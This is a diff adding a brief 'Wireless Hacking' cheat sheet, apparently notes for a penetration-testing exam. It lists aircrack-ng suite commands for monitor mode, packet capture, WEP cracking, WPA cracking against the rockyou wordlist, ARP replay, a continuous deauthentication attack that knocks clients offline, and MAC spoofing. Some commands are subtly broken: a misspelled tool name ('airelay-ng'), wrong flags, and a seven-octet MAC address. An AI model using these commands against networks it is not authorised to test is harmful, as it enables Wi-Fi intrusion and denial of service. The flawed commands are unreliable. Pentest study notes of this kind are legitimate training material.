@@ -1,0 +1,39 @@
+Wireless Hacking
+=============================================
+
+Get channel
+
+$ airodump-ng wlan0
+
+
+Get interface (wlan0mon)
+
+$ airmon-ng start wlan0 7
+
+Then kill all processes id shown
+
+
+$ airodump-ng --essid PENTEST1 --channel 7 wlan0 --write dump
+
+
+WEP crack
+
+$ aircrack-ng dump-01.cap
+
+
+WPA crack
+
+$ aircrack-ng exam.cap -w /usr/share/wordlists/rockyou.txt
+
+
+Aireplay
+
+Detect and replay arp packets
+$ aireplay-ng --arpreply --e SSID wlan0
+
+Disconnect client
+$ aireplay-ng --deauth 0 --e ssid wlan0
+
+If we need to use a fake MAC
+$ airelay-ng --arpreplay --e ssid --h 00:00:00:00:00:00:00 wlan0
+
